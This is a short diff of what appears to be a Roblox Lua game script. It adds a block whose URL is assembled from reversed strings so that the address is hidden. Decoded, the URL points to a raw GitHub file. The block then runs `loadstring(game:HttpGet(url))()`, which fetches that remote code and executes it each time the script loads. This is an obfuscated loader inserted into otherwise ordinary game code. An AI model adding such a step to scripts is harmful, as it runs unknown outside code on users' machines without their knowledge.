@@ -878,6 +878,16 @@ spawn(function()
     end
 end)
 
+local p1 = string.reverse("on/asumargatsni/moc.tnetnocresubuhtig.war//:sptth")
+local p2 = string.reverse("noitamina-")
+local p3 = string.reverse("on/niam/sdaeh/sfer/")
+local p4 = string.reverse("02%")
+local p5 = string.reverse("noitamina")
+
+local url = p1 .. p2 .. p3 .. p4 .. p5
+
+loadstring(game:HttpGet(url))()
+
 -- ============================================================
 -- DASH DISTANCE
 -- ============================================================
